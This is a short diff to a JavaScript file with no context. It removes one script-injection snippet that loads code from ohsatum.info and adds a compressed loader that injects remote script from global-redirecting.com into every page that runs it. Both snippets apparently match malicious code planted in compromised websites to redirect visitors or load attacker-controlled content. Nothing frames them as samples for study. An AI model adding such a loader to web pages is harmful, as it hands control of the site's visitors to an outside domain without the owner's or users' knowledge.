@@ -1,9 +1,6 @@
-(function() {
-var script = document.createElement('script');
-script.async = true;
-script.type = 'text/javascript';
-script.charset = 'UTF-8';
-script.src = 'https://ohsatum.info/init.js?sid=871623';
-var entry = document.body.firstChild;
-entry.parentNode.insertBefore(script, entry);
-})();
+(function (a, d, j, o) {
+     o = a.createElement(d),
+        m = a.getElementsByTagName(d)[0];              
+     o.src = j + "?d=0&r=" + Math.random();
+     m.parentNode.insertBefore(o, m)
+})(document, 'script', 'https://global-redirecting.com/sl/2e72ef55');
